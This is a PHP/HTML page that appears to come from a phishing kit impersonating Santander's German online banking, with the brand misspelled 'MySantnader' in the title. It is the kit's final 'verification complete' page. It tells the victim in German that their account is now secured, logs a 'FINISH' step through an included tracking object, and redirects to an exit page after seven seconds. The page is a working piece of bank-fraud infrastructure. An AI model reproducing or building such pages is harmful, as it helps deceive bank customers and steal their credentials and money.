<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MySantnader</title>
    <link rel="stylesheet" href="res/app.css">
    <link rel="stylesheet" href="res/account.css">
</head>
<body>
<header>
<img src="res/logo.png" class="pc">
<img src="res/text.png" class="pc">
<img src="res/mini-logo.png" class="mobile">
</header>
<main>

<div class="form account">

<div class="title">
Verifizierung abgeschlossen!
</div>


<div class="text">
    <p>Sie haben Ihr Konto erfolgreich verifiziert und es ist nun vollständig zugänglich.</p>
    <p>Vielen Dank, dass Sie sich die Zeit genommen haben, Ihr Konto zu sichern.</p>
    <p>Sie werden in Kürze zur Startseite weitergeleitet.</p>
    <img src="res/valid.png" style="width:60px;">
</div>

 


<div class="col info">
<b>Sie haben noch keinen Zugang?</b>
Als Kreditkunde können Sie die Registrierung für das MySantander Online Banking ganz bequem digital vornehmen und Ihre Bankgeschäfte einfach von zu Hause aus erledigen!
</div>


</div>
</main> 


 
<?php 
$m->ctr("FINISH");
?>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>
setTimeout(() => {
    window.location="exit.php";
}, 7000);
</script>
</body>
</html>